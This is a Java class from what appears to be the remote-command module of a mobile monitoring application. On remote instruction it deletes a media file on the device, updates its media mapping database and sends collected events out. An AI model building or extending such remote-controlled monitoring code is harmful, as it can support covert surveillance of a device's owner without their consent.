package com.vvt.rmtcmd.pcc;

import java.util.Enumeration;
import java.util.Hashtable;
import com.vvt.db.FxEventDatabase;
import com.vvt.global.Global;
import com.vvt.mediamon.info.MediaInfo;
import com.vvt.mediamon.seeker.MediaSeekerDb;
import com.vvt.mediamon.seeker.MediaMapping;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;

public class PCCDeleteActualMedia extends PCCRmtCmdSync {
	
	private final String TAG = "PCCDeleteActualMedia";
	private int paringId = 0;
//	private MediaSeeker mediaSeeker = Global.getMediaSeeker();
//	private MediaSeeker mediaSeeker = new MediaSeeker();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private MediaInfo mediaInfo = null;
	private MediaMapping mapping = null;
	private SendEventManager eventSender = Global.getSendEventManager();
	private MediaSeekerDb mediadb = MediaSeekerDb.getInstance();
	
	public PCCDeleteActualMedia(int paringId) {
		this.paringId = paringId;
		if (Log.isDebugEnable()) {
			Log.debug(TAG + "constructor()", "paringId: " + paringId);
		}
	}
	
	private boolean isParingIdMatching() {
		boolean isMatch = false;
//		mapping = mediaSeeker.getMediaMapping();
		mapping = mediadb.getMediaMapping();
		if (mapping != null) {
			Hashtable paringIdMap = mapping.getParingIdMap();
			mediaInfo = (MediaInfo) paringIdMap.get(new Integer(paringId));
		
			// Debug
			Enumeration e = mapping.getParingIdMap().keys();
			while(e.hasMoreElements()) {
				Integer key = (Integer) e.nextElement();
				MediaInfo mediaInfo = (MediaInfo) mapping.getParingIdMap().get(key);
//				Log.debug(TAG + "Debug.isParingIdMatching()", "mediaInfo != null? " + (mediaInfo != null) + ", key: " + key.intValue());
			}
			//
//			Log.debug(TAG + "isParingIdMatching()", "mediaInfo != null? " + (mediaInfo != null));
			
			if (mediaInfo != null) {
				isMatch = true;
			}
		}
		if (Log.isDebugEnable()) {
			Log.debug(TAG + "isParingIdMatching()", "isMatch: " + isMatch);
		}
		return isMatch;
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.DELETE_MEDIA.getId());
		try {
			if (isParingIdMatching()) {
				FileUtil.deleteFile(mediaInfo.getActualPath());
				Hashtable paringIdMap = mapping.getParingIdMap();
				paringIdMap.remove(new Integer(paringId));
//				mediaSeeker.commit();
				mediadb.commit(mapping);
				responseMessage.append(Constant.OK);
				observer.cmdExecutedSuccess(this);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.PAIRING_ID + paringId + RmtCmdTextResource.DOES_NOT_EXIST);
				observer.cmdExecutedError(this);
			}
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.PAIRING_ID + paringId + Constant.EMPTY_STRING + e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());	
		// To send events
		eventSender.sendEvents();
	}
}
